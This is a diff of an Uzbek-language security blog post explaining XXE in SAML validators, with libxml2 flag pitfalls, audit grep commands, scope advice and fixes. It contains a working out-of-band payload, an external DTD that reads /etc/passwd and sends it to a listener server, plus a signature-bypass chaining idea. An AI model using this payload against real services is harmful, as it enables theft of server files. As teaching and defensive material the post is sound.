@@ -1,27 +1,27 @@
 ---
-title: "SAML validatorlarida XXE: imzo tekshirilishidan oldin fayl o'qish"
+title: "SAML validatorlarida XXE: imzo tekshirilmasidan oldin fayl o'qib olish"
 date: 2026-08-14T10:30:00+05:00
 tags: ["xxe", "saml", "methodology"]
 slug: "saml-parser-xxe"
 translationKey: saml-parser-xxe
 draft: false
-summary: "Nega SAML token validatorlari XXE uchun zaif nuqta, libxml2 sozlamalari ularni qanday sotib qo'yadi, va men buni qanday qidiraman — asosdan boshlab."
+summary: "SAML token validatorlari nega XXE uchun qulay nishon, libxml2'ning asl sozlamalari ularni qanday sotib qo'yadi, va men buni qanday qidiraman — eng boshidan."
 ---
 
-SAML — bu XML, XML parserlari esa maxsus aytmasang sen uchun diskdan fayllarni o'qib beradi.
-Shu ikki fakt yonma-yon turgani — butun bug shu. SAML tokenni tekshiradigan kod XXE topishning
-eng ishonchli joylaridan biri, va bu post nima uchun ekani haqida — boshidan boshlab, hech
-qachon XXE payload otmagan bo'lsang ham tushunarli bo'lsin deb.
+SAML aslida XML'dan boshqa narsa emas. XML parserlar esa, maxsus to'xtatmasang, diskdagi
+fayllarni bemalol o'qishga tayyor turadi. Ana shu ikki narsa bir joyga tushsa — butun bug shu.
+SAML tokenni tekshiradigan kod XXE topish uchun eng ishonchli joylardan biri, va bu post nega
+shundayligi haqida. Hammasini eng boshidan olaman, hech qachon XXE payload otib ko'rmagan
+bo'lsang ham tushunarli bo'lsin deb.
 
-Bu — aniq bug emas, bug klassi haqida writeup. Mahsulot yo'q, vendor yo'q. SAML gapiradigan
-biror narsani audit qilsang — SSO login jarayoni, token validatsiya xizmati, soket orqali
-autentifikatsiya qiladigan agent — izlaydigan shakling shu.
+Bu — aniq bir bug haqida emas, butun bir klass haqida. Mahsulot ham yo'q, vendor ham. SAML
+gapiradigan biror narsani kovlayotgan bo'lsang — SSO login, token tekshiruvchi xizmat, soket
+orqali autentifikatsiya qiladigan agent — izlaydigan naqshing mana shu.
 
-## Avval, XXE nima o'zi
+## Avvalo, XXE o'zi nima
 
-XML **entity** deb ataladigan qisqartmalar belgilashga imkon beradi. Ichki qurilganlarini
-ko'rgansan: `&lt;` bu `<` ga, `&amp;` bu `&` ga aylanadi. O'zingnikini ham e'lon qilsang
-bo'ladi:
+XML'da **entity** degan qisqartmalar bor. Tayyorlaridan bir nechtasini ko'rgansan: `&lt;` —
+bu `<`, `&amp;` — bu `&`. O'zing ham yangisini e'lon qilishing mumkin:
 
 ```xml
 <!DOCTYPE foo [
@@ -30,11 +30,11 @@ bo'ladi:
 <foo>&greeting;</foo>
 ```
 
-Parser buni o'qiganda, `&greeting;` `hello` bilan almashadi. Hozircha zararsiz — bu shunchaki
-hujjat ichidagi topib-almashtirish.
+Parser buni o'qiganda `&greeting;` o'rniga `hello` qo'yadi. Bu yerda zararli hech narsa yo'q —
+oddiy topib-almashtirish, hujjat ichida qoladi.
 
-Xavfli joyi shundaki, entity qiymati sen ichkarida yozgan matn bo'lishi shart emas. U
-**tashqi** narsaga — fayl yoki URL'ga — ishora qilishi mumkin:
+Xavf boshqa joyda. Entity'ning qiymati sen yozib qo'ygan matn bo'lishi shart emas — u
+**tashqaridagi** narsaga, faylga yoki URL'ga ishora qilishi mumkin:
 
 ```xml
 <!DOCTYPE foo [
@@ -43,94 +43,94 @@ Xavfli joyi shundaki, entity qiymati sen ichkarida yozgan matn bo'lishi shart em
 <foo>&secret;</foo>
 ```
 
-Endi `&secret;` degani *"borib `/etc/passwd` ni och va uning mazmunini shu yerga qo'y"*. Agar
-parser tashqi entity'larni ochishga sozlangan bo'lsa, u aynan shuni qiladi — faylni o'qiydi va
-mazmunini hujjatga tashlaydi. Bu — **XXE**: XML eXternal Entity injection. Hujumchining XML'i
-parserga hech qachon tegmasligi kerak bo'lgan narsalarni olishni buyuradi — lokal fayllar yoki
-ichki tarmoqdagi URL'lar (XXE shu tariqa SSRF'ga aylanadi).
+Endi `&secret;` degani — *"borib `/etc/passwd` ni och, ichidagini shu yerga ko'chir"*. Agar
+parser tashqi entity'larni ochadigan qilib sozlangan bo'lsa, aynan shuni qiladi: faylni o'qiydi
+va mazmunini hujjatga joylaydi. Mana shu — **XXE**, ya'ni XML eXternal Entity injection.
+Hujumchining XML'i parserni hech qachon tegmasligi kerak bo'lgan narsalarga yo'llaydi — lokal
+fayllarga yoki ichki tarmoqdagi URL'larga (XXE aynan shu tariqa SSRF'ga aylanadi).
 
-Parser qaysi entity'larni ochishi qoidalari **DTD** (Document Type Definition) dan keladi —
-`<!DOCTYPE ... [ ... ]>` ichidagi blok. DTD hujjat ichida turishi mumkin, yoki hujjat *"DTD'mni
-ana u yerdan yukla"* deb URL'ga ishora qilishi mumkin. Ikkovi ham biz tortadigan richag.
+Qaysi entity'lar ochilishini **DTD** (Document Type Definition) belgilaydi — `<!DOCTYPE ... [
+... ]>` ichidagi blok. DTD hujjatning o'zida turishi mumkin, yoki hujjat *"DTD'imni anavi
+yerdan olib kel"* deb URL ko'rsatishi mumkin. Biz mana shu ikki richagni ishlatamiz.
 
-Bir qatorli xulosa: **agar parser entity'larni ochsa va fayllar hamda URL'larga chiqishga tayyor
-bo'lsa, XML'ni boshqargan har kim uni narsalarni o'qishga majbur qila oladi.** SAML tokenlari —
-hujumchi bergan XML. Bu qayoqqa borishini ko'ryapsan.
+Bir qatorda aytganda: **parser entity'larni ochsa va fayl-u URL'larga chiqishga tayyor bo'lsa,
+XML'ni yozgan har kim uni istagan narsasini o'qishga majburlay oladi.** SAML token esa —
+hujumchi yuborgan XML. Endi bu ish qayoqqa ketishini o'zing ham sezyapsan.
 
 ## Nega aynan validator
 
-Odamlarni chalg'itadigan joyi shu. "SAML token imzolangan," deyishadi, "hujumchi soxtalashtira
-olmaydi." To'g'ri — lekin ahamiyatsiz, mana nega.
+Odamlar aynan shu joyda adashadi. "SAML token imzolangan-ku," deyishadi, "hujumchi soxtasini
+yasay olmaydi." To'g'ri — lekin bu yerda ahamiyati yo'q, sababini aytaman.
 
-Imzoni tekshirish uchun avval hujjat xotirada bo'lishi shart. Shuning uchun validator doim
-shuni, shu tartibda qiladi:
+Imzoni tekshirish uchun avval hujjat xotirada bo'lishi kerak. Shu bois validator har doim
+quyidagini, aynan shu tartibda bajaradi:
 
-1. XML'ni xotiradagi daraxtga **parse** qilish
-2. Sxemani tekshirish
-3. Subject, shartlar, vaqt belgilarini tekshirish
-4. **Imzoni tekshirish**
+1. XML'ni xotiradagi daraxtga **parse** qiladi
+2. Sxemani tekshiradi
+3. Subject'ni, shartlarni, vaqt belgilarini tekshiradi
+4. **Imzoni tekshiradi**
 
-Imzo tekshiruvi — to'rtinchi qadam. Entity ochilishi — fayl o'qish — birinchi qadamda, parse
-paytida sodir bo'ladi. Kod to'rtinchi qadamga yetib *"bu imzo axlat, rad et"* degunicha, fayl
-allaqachon o'qilgan va, ko'rasanki, allaqachon senga yuborilgan.
+Imzo — to'rtinchi qadamda. Entity ochilishi, ya'ni fayl o'qish esa — birinchisida, parse
+paytida. Kod to'rtinchi qadamga yetib *"bu imzo yaroqsiz, rad et"* degunicha, fayl allaqachon
+o'qib bo'lingan va, hozir ko'rasan, allaqachon senga jo'natilgan ham.
 
-Ya'ni biz yaroqli tokenni soxtalashtirmayapmiz. Biz **ataylab yaroqsiz** tokenni yuboryapmiz,
-uning yagona vazifasi — zararli entity'larni olib borish. Token har safar to'rtinchi qadamda
-rad etiladi — va bizga farqi yo'q, chunki payload birinchi qadamda otildi.
+Ya'ni biz yaroqli token yasashga urinmayapmiz. Biz **ataylab yaroqsiz** tokenni yuboryapmiz —
+uning yagona vazifasi zararli entity'larni ichiga olib kirish. Token har safar to'rtinchi
+qadamda rad etiladi, bizga esa parvo emas: payload birinchi qadamdayoq otilib bo'lgan.
 
 ```goat
   hujumchi token   .-------------.  entity ochiladi   .------------.
-  (yomon imzo)   ->|  XML parse  |----- fayl o'qish ->|  /etc/...  |
+  (yaroqsiz imzo)->|  XML parse  |----- fayl o'qish ->|  /etc/...  |
                    '------+------'   HTTP exfil        '------------'
                           |
                           v          o'qish yuqorida bo'lib bo'ldi;
-                   .-------------.   bu rad etish endi juda kech
+                   .-------------.   bu rad etish endi kech
                    |  validatsiya|
                    '-------------'
 ```
 
 ## libxml2 tuzog'i
 
-SAML bilan ishlaydigan C va C++ kodining ko'pi **libxml2** ustida turadi, libxml2 esa qanaqa
-flag bersang shuni qiladi. Bug odatda shu yerda yashaydi. Ehtiyotkor ko'rinadigan parse
-chaqiruvi:
+SAML bilan ishlaydigan C va C++ kodning aksariyati **libxml2** ustiga qurilgan, libxml2 esa
+qanaqa flag bersang, o'shanga qarab ish tutadi. Bug ko'pincha shu yerda yashiringan. Ko'zga
+ehtiyotkor ko'rinadigan parse chaqiruvi:
 
 ```c
 doc = xmlReadMemory(token, len, NULL, NULL,
-                    XML_PARSE_NOENT   |   // entity'larni ochish
-                    XML_PARSE_DTDATTR |   // DTD atributlarini qayta ishlash
-                    XML_PARSE_DTDLOAD);   // tashqi DTD'larni yuklash
+                    XML_PARSE_NOENT   |   // entity'larni ochadi
+                    XML_PARSE_DTDATTR |   // DTD atributlarini qayta ishlaydi
+                    XML_PARSE_DTDLOAD);   // tashqi DTD'larni yuklaydi
 ```
 
-Shu uch flagni oddiy tilda o'qi:
+Shu uch flagni oddiy tilga o'girsak:
 
-- `XML_PARSE_NOENT` — *"entity'larni och"* (ha, nomi teskari; o'tkazib yuborish emas,
-  almashtirish degani)
-- `XML_PARSE_DTDLOAD` — *"hujjat tashqi DTD'ga ishora qilsa, borib ol"*
-- Yetishmayotgani: `XML_PARSE_NONET` — *"tarmoqni umuman ishlatma."*
+- `XML_PARSE_NOENT` — *"entity'larni och"* (ha, nomi teskari; "no entity" emas, aynan almashtir
+  degani)
+- `XML_PARSE_DTDLOAD` — *"hujjat tashqi DTD ko'rsatsa, borib olib kel"*
+- Yetishmayotgani: `XML_PARSE_NONET` — *"tarmoqqa umuman chiqma."*
 
-Shu oxirgi flag — xavfsizlik kamari, va u taqilmagan. `DTDLOAD` yoqilgan, `NONET` o'chirilgan
-holda, parser parse paytida bemalol tarmoq so'rovlarini qiladi. Entity ochilishi bilan birga —
-bu to'liq o'qlangan XXE.
+Mana shu oxirgisi — xavfsizlik kamari, va u bog'lanmagan. `DTDLOAD` yoniq, `NONET` o'chiq
+bo'lsa, parser parse paytida bemalol tarmoqqa so'rov yuboradi. Entity ochilishini ham ustiga
+qo'shsang — to'la o'qlangan XXE tayyor.
 
-Kutubxona darajasida xuddi shu narsani hal qiladigan yana ikki global kalit bor, ularga
-tegmagan kod eski libxml2 versiyalaridagi xavfli odatiy qiymatni meros oladi:
+Xuddi shu ishni quyiroq darajada hal qiladigan yana ikki global kalit bor. Ularga tegmagan kod
+eski libxml2 versiyalaridan xavfli standart holatni meros qilib oladi:
 
 ```c
-xmlSubstituteEntitiesDefault(1);   // 1 = entity'larni ochish
-xmlLoadExtDtdDefaultValue = 1;     // 1 = tashqi DTD'larni yuklash
+xmlSubstituteEntitiesDefault(1);   // 1 = entity'larni ochadi
+xmlLoadExtDtdDefaultValue = 1;     // 1 = tashqi DTD'larni yuklaydi
 ```
 
-Men tez-tez uchratadigan naqsh: kodning xavfsiz versiyasi **bor**, lekin u build hech qachon
-aniqlamaydigan `#ifdef` bilan o'ralgan. Kimdir tuzatishni yozgan, "keyin yoqamiz" deb
-kompilyatsiya flagi ortiga qo'ygan, va aslida chiqadigani — zaif `#else` shoxi. Manbani o'qish
-tuzatish borligini aytadi; yoqilganini aytmaydi. Qaysi shox kompilyatsiya bo'lganini tekshirishing
-kerak.
+Menga tez-tez uchraydigan bir manzara: kodning xavfsiz varianti aslida **bor**, lekin u build
+hech qachon yoqmaydigan `#ifdef` ichiga o'ralib qolgan. Kimdir tuzatishni yozgan, "keyinroq
+yoqarmiz" deb kompilyatsiya flagi ortiga surib qo'ygan, natijada haqiqatda chiqadigani —
+zaif `#else` shoxi. Manbani o'qiganing tuzatish borligini ko'rsatadi, lekin uning yoqilgan yoki
+yoqilmaganini aytmaydi. Qaysi shox kompilyatsiya bo'lganini alohida tekshirishing shart.
 
-## Buni fayl o'qishga aylantirish, qadam-baqadam
+## Buni fayl o'qishga aylantirish — qadam-baqadam
 
-Payloadni sekin quraylik. Yuboradigan tokenimiz **biz** boshqaradigan serverga ishora qiladigan
-DTD olib yuradi:
+Payloadni shoshilmasdan yig'aylik. Yuboradigan tokenimiz **o'zimiz** boshqaradigan serverga
+ishora qiladigan DTD olib boradi:
 
 ```xml
 <?xml version="1.0"?>
@@ -145,14 +145,14 @@ DTD olib yuradi:
 
 Ikki narsaga e'tibor ber:
 
-- `%dtd;` `&` emas, `%` ishlatadi. Bu — **parameter entity** — hujjat tanasida emas, DTD
-  ichida ishlatiladigan entity. Bizga kerak, chunki pastdagi hiyla faqat parameter entity bilan
-  ishlaydi.
-- Pastdagi `saml:Assertion` — tokenga o'xshab ko'rinishi uchun yetarli shakl. Yaroqli imzo
-  kerak emas. Haqiqiy assertion bo'lishi kerak emas. Faqat parserga yetib borishi kerak.
+- `%dtd;` da `&` emas, `%` turibdi. Bu — **parameter entity**, ya'ni hujjat tanasida emas,
+  DTD'ning o'z ichida ishlaydigan entity. Bizga kerak, chunki pastdagi hiyla faqat parameter
+  entity bilan ishlaydi.
+- Pastdagi `saml:Assertion` — tokenga o'xshab tursin degan shakl, xolos. Yaroqli imzo kerak
+  emas. Haqiqiy assertion bo'lishi ham shart emas. Uning vazifasi bitta: parserga yetib borish.
 
-Validator buni parse qilganda, `%dtd;` ga uchraydi va serverimizdan
-`http://127.0.0.1:9090/x.dtd` ni oladi. Biz qaytaradigan narsa:
+Validator buni parse qilganda `%dtd;` ga duch keladi va serverimizdan
+`http://127.0.0.1:9090/x.dtd` ni oladi. Biz javob qilib mana buni qaytaramiz:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -161,85 +161,86 @@ Validator buni parse qilganda, `%dtd;` ga uchraydi va serverimizdan
 %exfil;
 ```
 
-Parser bu bilan nima qilishini bosib chiqaylik:
+Parser bu bilan nima qilishini qadam-baqadam ko'raylik:
 
-1. `%file` — `/etc/passwd` ni ochadi, mazmunini ushlab turadi.
-2. `%wrap` — **yangi** entity, `exfil`, quradi, uning qiymati — query string'ga fayl mazmuni
-   yopishtirilgan URL.
-3. `%exfil;` — o'sha entity'ni ochadi, bu parserni
-   `http://127.0.0.1:9090/?d=<passwd mazmuni>` so'rov qilishga majbur qiladi.
+1. `%file` — `/etc/passwd` ni ochadi, ichidagini ushlab turadi.
+2. `%wrap` — **yangi** entity, ya'ni `exfil` ni yasaydi; uning qiymati — query string'ga fayl
+   mazmuni yopishtirilgan URL.
+3. `%exfil;` — o'sha entity'ni ochadi va parser
+   `http://127.0.0.1:9090/?d=<passwd mazmuni>` ga so'rov yuboradi.
 
-Serverimiz, u ham tinglovchi, query string'i **aynan fayl** bo'lgan so'rovni oladi. Bu — o'qilgan
-narsa, tashqariga chiqarilgan.
+Serverimiz — u ham tinglovchi vazifasini o'taydi — query string'i **aynan o'sha fayl** bo'lgan
+so'rovni qabul qiladi. Fayl o'qildi va tashqariga chiqarildi.
 
-Nega to'g'ridan `file:///etc/passwd` emas, ikki-serverli raqs? Chunki validator deyarli hech
-qachon parse qilingan hujjatni ko'rsatmaydi — tokenni rad qiladi va xatolik qaytaradi. Ya'ni
-fayl mazmuni bizga *javob orqali* qaytolmaydi. Buning o'rniga parserni uni yon kanal orqali
-bizga pochtalab yuborishga majbur qilamiz: o'zining chiquvchi HTTP so'rovi. Bu — **out-of-band
-(OOB)** naqsh, va yuqoridagi ichma-ich parameter-entity DTD — buni qilishning standart yo'li.
+Nega to'g'ridan-to'g'ri `file:///etc/passwd` emas, buncha ikki serverli o'yin? Chunki validator
+parse qilgan hujjatni deyarli hech qachon senga ko'rsatmaydi — tokenni rad etadi va xatolik
+qaytaradi. Demak fayl mazmuni senga *javob orqali* qaytmaydi. Shu bois biz parserni faylni o'z
+chiquvchi HTTP so'rovi orqali, yon eshikdan olib chiqishga majburlaymiz. Mana bu —
+**out-of-band (OOB)** usul, va yuqoridagi ichma-ich parameter-entity DTD — uni amalga
+oshirishning klassik yo'li.
 
-Otilishini hal qiladigan ikki tuzoq:
+Payload otilishiga ta'sir qiladigan ikki nozik joy:
 
-- **Agar** ilova parse qilingan qiymatni senga qaytarsa, bularning hammasini o'tkazib yubor —
-  tokendagi oddiy `file:///` entity yetarli, faylni to'g'ridan javobdan o'qiysan. OOB — hech
-  narsa qaytmaydigan keng tarqalgan holat uchun zaxira.
-- **Ba'zi fayl mazmunlari payloadni buzadi.** Fayl ichidagi `%`, `&`, yoki xom yangi qator
-  entity o'ramini buzishi mumkin. `/etc/passwd` va `/etc/hostname` yaxshi. Iflosroq fayllar
-  uchun, stack ruxsat bersa, o'qishni base64 filtriga o'raysan, shunda baytlar yo'lda omon
-  qoladi.
+- **Agar** ilova parse qilgan qiymatni senga qaytarsa, bularning hammasiga hojat yo'q —
+  tokendagi oddiy `file:///` entity kifoya, faylni to'g'ridan javobdan o'qiysan. OOB — hech
+  narsa qaytmaydigan, eng ko'p uchraydigan holat uchun zaxira yo'l.
+- **Ba'zi fayl mazmunlari payloadni buzadi.** Fayl ichidagi `%`, `&` yoki xom yangi qator
+  entity o'ramini sindirib qo'yishi mumkin. `/etc/passwd`, `/etc/hostname` kabilari bilan
+  muammo yo'q. Ichi noqulayroq fayllar uchun, stack ruxsat bersa, o'qishni base64 filtriga
+  o'raysan — shunda baytlar yo'lda buzilmay yetib boradi.
 
-## Imzo yo'lda tursa
+## Imzo yo'lni to'sib tursa
 
-Ba'zan validator imzosiz tokenni umuman parse qilmaydi — parse'dan oldin *biror narsani*
-tekshiradi va chiqib ketadi. Bu OOB o'qishni boshlanmasdan o'ldiradi. O'sha yerda **ikkinchi,
-mustaqil zaiflik** uni tiriltirishi mumkin: imzo tekshiruvini o'tkazib yuborishga imkon
+Ba'zan validator imzosiz tokenni umuman parse ham qilmaydi — parse'dan oldin *nimanidir*
+tekshiradi-yu, to'xtab qoladi. Bu OOB o'qishni boshlanmasdan bo'g'adi. Aynan shu yerda
+**ikkinchi, alohida zaiflik** uni tiriltirib yuboradi: imzo tekshiruvini chetlab o'tishga imkon
 beradigan auth yo'li.
 
-Men buni *"ishonchli chaqiruvchi"* flagi sifatida uchratganman — so'rovdagi maydon, mohiyatan
-*"bu token yuqorida allaqachon tekshirilgan, qayta tekshirib o'tirma"* deydi — xizmat uni
-aslida umuman ishonchli bo'lmagan chaqiruvchilardan qabul qiladi. O'zi bilan bu — autentifikatsiya
-bypass. XXE bilan zanjirlansa, oxirgi darvozani ochadi: endi parser sening kirishing ustida
-oldida hech narsa turmagan holda ishlaydi.
+Men buni *"ishonchli chaqiruvchi"* flagi ko'rinishida uchratganman — so'rovdagi maydon, mazmunan
+*"bu token yuqorida allaqachon tekshirilgan, qaytadan tekshirib o'tirma"* deydi. Xizmat esa buni
+aslida umuman ishonchli bo'lmagan chaqiruvchilardan ham qabul qilaveradi. O'zicha bu allaqachon
+autentifikatsiya bypass. XXE bilan zanjirlansa — oxirgi to'siqni ham olib tashlaydi: endi
+parser sening kiritmalaring ustidan, oldida hech narsa turmagan holda ishlaydi.
 
-Xulosa — aniq flag emas. Xulosa shu: validatordagi XXE'ni imzo tekshiruvi yo'lda tursa **ham**
-quvish arziydi — chunki imzo tekshiruvlari aynan `// TODO: buni haqiqatan tekshir` olib baribir
-chiqib ketadigan kod.
+Xulosa aniq bir flagda emas. Xulosa shunda: validatordagi XXE'ni imzo tekshiruvi yo'lda tursa
+**ham** quvish arziydi — chunki imzo tekshiruvlari aynan `// TODO: buni haqiqatdan tekshir`
+olib, o'sha holda chiqib ketaveradigan koddan.
 
 ## Men buni qanday qidiraman
 
-**Manba bor bo'lsa.** Parse chaqiruvlari va kalitlarni grep qil:
+**Manba ochiq bo'lsa.** Parse chaqiruvlari va kalitlarni grepla:
 
 ```bash
 # XML qayerda parse qilinadi
 grep -rn "xmlReadMemory\|xmlParseMemory\|xmlReadDoc\|xmlCtxtReadMemory" .
 # kutubxona darajasidagi kalitlar
 grep -rn "xmlSubstituteEntitiesDefault\|xmlLoadExtDtdDefaultValue" .
-# build flagi ortida yashiringan xavfsiz yo'l
-grep -rn "XML_PARSE_NONET" .        # keyin haqiqatan kompilyatsiya bo'lganini tasdiqla
+# build flagi ortiga yashiringan xavfsiz yo'l
+grep -rn "XML_PARSE_NONET" .        # keyin haqiqatdan kompilyatsiya bo'lganini tasdiqla
 ```
 
-Agar parse DTD yuklasa-yu `XML_PARSE_NONET` bo'lmasa — yoki faqat build hech qachon
-o'rnatmaydigan `#ifdef` ichida bo'lsa — senda nomzod bor. Xursand bo'lishdan oldin qaysi shox
-chiqarilganini tasdiqla.
+Agar parse DTD yuklasa-yu, `XML_PARSE_NONET` bo'lmasa — yoki faqat build hech qachon
+yoqmaydigan `#ifdef` ichida bo'lsa — senda nomzod bor. Xursand bo'lishdan oldin qaysi shox
+chiqqanini tasdiqlab ol.
 
-**Black box.** DTD'si sen boshqaradigan hostga ishora qiladigan token yubor, va o'sha hostni
-callback uchun kuzat. OOB tinglovchi — o'z HTTP serving, yoki Collaborator uslubidagi xizmat —
-bu yerda yagona ishonchli oracle, chunki validator deyarli doim tokenni rad qiladi va javobda
-senga hech narsa aytmaydi. **Rad etish — kutilgan narsa. Callback — topilma.** So'rov hech
-kelmasa, entity ochilishi ehtimol o'chiq, va davom etasan.
+**Qorong'u quti (black box).** DTD'si sen boshqaradigan hostga ishora qiladigan token yubor va
+o'sha hostni callback uchun kuzat. OOB tinglovchi — o'zingning HTTP serving yoki Collaborator
+uslubidagi xizmat — bu yerda yagona ishonchli o'lchov, chunki validator deyarli har doim tokenni
+rad etadi va javobda senga hech narsa demaydi. **Rad etilishi — kutilgan ish. Callback esa —
+topilma.** So'rov umuman kelmasa, entity ochilishi katta ehtimol o'chiq — davom etaverasan.
 
-## Chegaradan chiqmasdan tasdiqlash
+## Chegaradan chiqmaslik
 
-Exfil'ni o'qishga ruxsating bor faylga yo'nalt — o'zingniki bo'lgan mashinada `/etc/hostname`
-yoki o'zing tashlagan fayl — sirlarga emas, va hech qachon sinash ruxsating yo'q
-infratuzilmaga emas. Faqat callbackning o'zi entity ochilgani va o'qish sodir bo'lganini
-isbotlaydi. Zaiflikni ko'rsatish uchun `/etc/shadow` tortishing **shart emas**, birovning
-tizimida esa tortmasliging kerak. Mexanizmni isbotla, to'xta, yozib chiq. Tinglovching o'qishga
-ruxsating bor faylni qabul qilayotganini ko'rsatgan skrinshot — to'liq isbot.
+Exfilni o'qishga haqqing bor faylga yo'nalt — o'zingniki bo'lgan mashinada `/etc/hostname` yoki
+o'zing tashlagan fayl — sirlarga emas, va sinash ruxsating yo'q infratuzilmaga esa aslo. Faqat
+callbackning o'zi entity ochilganini va o'qish sodir bo'lganini isbotlaydi. Zaiflikni ko'rsatish
+uchun `/etc/shadow` ni sug'urib olishing **shart emas**, birovning tizimida esa buni qilmasliging
+kerak. Mexanizmni isbotla, to'xta, yozib chiq. Tinglovching o'qishga haqqing bor faylni qabul
+qilayotganini ko'rsatgan skrinshot — to'la-to'kis isbot.
 
 ## Tuzatish
 
-Parser uchun: `XML_PARSE_NONET` qo'sh, va xavfsiz yo'lni build flagi ortiga yashirma — uni
+Parser uchun: `XML_PARSE_NONET` ni qo'sh, va xavfsiz yo'lni build flagi ortiga yashirma — uni
 shartsiz kompilyatsiya qil.
 
 ```c
@@ -248,16 +249,15 @@ doc = xmlReadMemory(token, len, NULL, NULL,
                     | XML_PARSE_NONET);
 ```
 
-Undan ham yaxshisi: SAML validatorining tashqi DTD yuklashga umuman ishi yo'q. Entity
+Undan ham to'g'risi: SAML validatoriga tashqi DTD yuklashning umuman keragi yo'q. Entity
 ochilishini butunlay o'chir (`xmlSubstituteEntitiesDefault(0)`, `xmlLoadExtDtdDefaultValue = 0`)
-va tarmoq o'chiq holda parse qil. Qatlamli himoya, va hech narsa yo'qotmaysan — haqiqiy
-SAML tokenlariga tashqi DTD kerak emas. Va qanaqadir "imzoni o'tkazib yubor" yo'li bo'lsa, u
-chaqiruvchining haqiqatan imtiyozli ekaniga bog'lansin, chaqiruvchi o'zi o'rnatadigan flagga
-emas.
+va tarmoq o'chiq holda parse qil. Qatlamli himoya, ustiga hech narsa yo'qotmaysan — haqiqiy SAML
+tokenlariga tashqi DTD kerak emas. "Imzoni chetlab o't" degan yo'l bo'lsa ham, u chaqiruvchining
+haqiqatan imtiyozli ekaniga bog'lansin, chaqiruvchining o'zi o'rnatadigan flagga emas.
 
 ## Xulosa
 
-SAML ko'rsang, bitta savol ber: **buni nima parse qiladi, va qaysi flaglar bilan?** Imzo —
-chalg'ituvchi narsa; qiziqarli kod undan oldin ishlaydi. Parse chaqiruvini top,
-`XML_PARSE_NONET` borligini tekshir, va yo'q bo'lsa — bitta out-of-band callback'gina seni aniq
-bilishdan ajratib turadi.
+SAML ko'rding — o'zingga bitta savol ber: **buni nima parse qiladi, va qaysi flaglar bilan?**
+Imzo — chalg'ituvchi narsa; qiziqarli kod undan oldin ishlaydi. Parse chaqiruvini top,
+`XML_PARSE_NONET` bor-yo'qligini qara, va bo'lmasa — bitta out-of-band callback'gina seni aniq
+javobdan ajratib turgan bo'ladi.
